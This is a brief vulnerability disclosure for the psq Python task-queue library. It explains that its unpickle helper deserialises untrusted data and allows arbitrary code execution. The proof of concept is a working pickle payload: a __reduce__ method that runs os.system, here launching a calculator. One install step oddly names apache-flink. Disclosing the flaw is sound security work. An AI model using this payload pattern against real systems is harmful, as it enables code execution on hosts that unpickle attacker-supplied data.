# Description
psq is an example Python implementation of a simple distributed task queue using Google Cloud Pub/Sub.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```python
import os
import pickle
#os.system('pip3 install psq')
from psq import utils
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#Exploiting
dumps = pickle.dumps(ArbitraryCode())
utils.unpickle(dumps)
```
* `pip3 install apache-flink`
* `python3 exploit.py`
